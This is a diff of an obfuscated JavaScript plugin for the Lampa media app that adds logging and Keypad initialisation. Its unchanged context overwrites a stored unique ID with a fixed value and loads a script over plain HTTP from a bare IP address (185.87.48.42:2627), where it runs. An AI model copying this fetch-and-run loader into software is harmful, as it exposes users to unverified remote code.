@@ -32,7 +32,9 @@
         if (typeof Lampa !== "undefined") {
             clearInterval(_0x32b0fb);
 
-            // 1. Инициализируем Layer независимо от проверки
+            console.log("Lampa найдена, начинаем инициализацию...");
+
+            // 1. Инициализируем Layer
             if (typeof Lampa.Layer !== "undefined" && typeof Lampa.Layer.init === "function") {
                 try {
                     console.log("Инициализация Layer...");
@@ -46,7 +48,7 @@
                 console.warn("Lampa.Layer или Layer.init не найдены!");
             }
 
-            // 2. Проверяем Manifest и origin
+            // 2. Проверяем наличие Manifest и origin
             if (!Lampa.Manifest || typeof Lampa.Manifest.origin !== "string") {
                 console.error("Manifest или origin отсутствует!");
                 return;
@@ -59,16 +61,33 @@
                 return;
             }
 
+            console.log("Manifest.origin прошёл проверку.");
+
             // 3. Проверка уникального идентификатора
             var _0x34a928 = Lampa.Storage.get("lampac_unic_id", "");
             if (_0x34a928 !== "tyusdt") {
+                console.log("Записываем уникальный идентификатор...");
                 Lampa.Storage.set("lampac_unic_id", "tyusdt");
             }
 
-            // 4. Асинхронно загружаем скрипт (изолировано)
+            // 4. Асинхронно загружаем скрипт
+            console.log("Начинаем загрузку скрипта...");
             Lampa.Utils.putScriptAsync(["http://185.87.48.42:2627/online.js"], function () {
                 console.log("Скрипт успешно загружен!");
             });
+
+            // 5. Проверяем инициализацию Keypad
+            if (typeof Lampa.Keypad !== "undefined" && typeof Lampa.Keypad.init === "function") {
+                try {
+                    console.log("Инициализация Keypad...");
+                    Lampa.Keypad.init();
+                    console.log("Keypad успешно инициализирован!");
+                } catch (e) {
+                    console.error("Ошибка при инициализации Keypad:", e);
+                }
+            } else {
+                console.warn("Lampa.Keypad или Keypad.init не найдены!");
+            }
         }
     }, 200);
 
